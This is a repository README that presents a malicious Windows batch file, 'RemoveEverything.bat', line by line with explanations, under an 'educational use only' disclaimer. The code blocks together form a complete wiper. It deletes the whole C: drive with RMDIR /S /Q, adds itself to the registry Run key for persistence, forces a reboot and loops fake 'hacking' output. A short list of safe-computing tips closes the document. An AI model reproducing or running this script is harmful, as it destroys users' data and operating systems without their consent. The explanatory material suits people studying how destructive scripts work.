# ⚠️ **Dangerous Batch Script - Educational Use Only** - RemoveEverything.bat

 **Overview**
 
This repository contains a **highly dangerous and malicious batch file** that can cause severe damage to a computer system. The purpose of this file is to demonstrate how batch scripting can be used maliciously. **Do not execute this file** under any circumstances unless you fully understand the risks and implications.

**This batch script, if run, will:**
- Delete the entire `C:` drive.
- Force a system reboot.
- Continuously display random numbers in an infinite loop.
- Set the script to run every time the computer starts by modifying the Windows registry.

**Warning**

This script is **malicious** and will destroy data on the target machine. Running it will result in **permanent loss of data** and **corruption of the operating system**, making the computer unbootable. This repository is for **educational purposes only** to demonstrate the dangers of batch files. Use this knowledge to better understand security and protect systems.

**Script Explanation**

Below is a detailed breakdown of each section of the batch script.

```batch
@echo off
```
- **What It Does**: Suppresses the display of command input on the screen. Without this, every command the script executes would be displayed in the command prompt.
- **Purpose**: Hides the operations from the user to make the malicious actions less noticeable.

---

```batch
RMDIR "C:/" /S /Q
```
- **What It Does**: This command attempts to remove (`RMDIR`) the entire `C:` drive and all its contents.
  - `/S` removes all files and subdirectories within the directory.
  - `/Q` performs the operation without prompting the user for confirmation.
- **Result**: Deletes critical system files and user data, which can render the system unusable. **This is the most destructive part of the script.**

---

```batch
set "currentFile=%~f0"
```
- **What It Does**: Sets the `currentFile` variable to the full path of the script itself. `%~f0` expands to the fully qualified path of the batch file.
- **Purpose**: This variable will be used later to make the script persistent by adding itself to the Windows registry.

---

```batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyScript" /t REG_SZ /d "%currentFile%" /f
```
- **What It Does**: This command adds a new entry to the Windows registry in the `Run` key, located at:
  `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - `/v "MyScript"`: This specifies the name of the value being added to the registry, in this case, "MyScript."
  - `/t REG_SZ`: Specifies that the type of data stored is a string (REG_SZ).
  - `/d "%currentFile%"`: Specifies the data to be added, which is the path to the script itself (from the `currentFile` variable).
  - `/f`: Forces the registry update without asking for confirmation.
- **Result**: This command ensures that the batch file runs every time the user logs into Windows, making it **persistent**. Even after rebooting, the script will execute automatically.

---

```batch
shutdown /r
```
- **What It Does**: Forces the system to reboot.
  - `/r` indicates a restart.
- **Result**: After attempting to delete the contents of the `C:` drive, the script forces a reboot, potentially causing the system to crash during startup.

---

```batch
:top
```
- **What It Does**: A label in the batch file that serves as a point for `goto` statements. In this case, it is used to create an infinite loop.
- **Purpose**: The script will loop back to this point to continually display random numbers in the console.

---

```batch
title hacking
```
- **What It Does**: Changes the title of the command prompt window to "hacking."
- **Purpose**: Aesthetic change to simulate "hacking activity."

---

```batch
echo %random%%random%%random%%random%...
```
- **What It Does**: Echoes a series of random numbers generated by the `%random%` variable. The script repeats `%random%` several times to fill the screen with numbers.
- **Purpose**: Creates the illusion of "hacking" by printing a stream of random numbers to the screen.
- **Result**: The console will continuously display random numbers until the script is terminated.

---

```batch
color 0a
```
- **What It Does**: Changes the text color in the command prompt to green on a black background (`0a`).
- **Purpose**: Enhances the visual effect, making the console look like a stereotypical "hacker" screen with green text.

---

```batch
goto top
```
- **What It Does**: Sends the script back to the `top` label, creating an infinite loop.
- **Result**: The script loops endlessly, continuing to display random numbers and preventing the user from easily exiting the script.

---

```batch
pause
```
- **What It Does**: Pauses the execution of the script and waits for the user to press a key to continue.
- **Note**: In this script, this command is unlikely to be reached because of the infinite loop created by the `goto top` statement.

---

**Detailed Functionality**

1. **Destructive Operations:**
   The script's first destructive action is the `RMDIR` command, which attempts to wipe out everything on the `C:` drive, including the operating system. This operation could potentially leave the system unbootable, as critical files will be deleted.

2. **Registry Persistence:**
   By adding itself to the Windows Registry under the `Run` key, the script ensures it will execute again upon system startup. This persistence makes it more difficult for the user to remove the script, as it will run automatically after every login.

3. **System Reboot:**
   Immediately after attempting to delete files, the script forces a reboot. If successful, the system might not boot properly due to missing files.

4. **Infinite Loop and "Hacker" Simulation:**
   The remaining part of the script is focused on creating an infinite loop that prints random numbers to the screen, which could make the system appear to be hacked or compromised. This part of the script is mostly aesthetic and is meant to confuse or scare the user.

**How to Protect Yourself**

This script demonstrates how easy it is to write a harmful batch file, but it also highlights the importance of practicing safe computing habits:
1. **Do not run untrusted scripts**: Always review the contents of any batch file before executing it, especially if downloaded from an unknown source.
2. **Backup your data regularly**: In case of malicious attacks or accidental deletion, having backups can save you from losing important data.
3. **Understand registry modifications**: The script modifies the Windows registry, which can have serious implications. Be aware of what registry keys do before editing them.
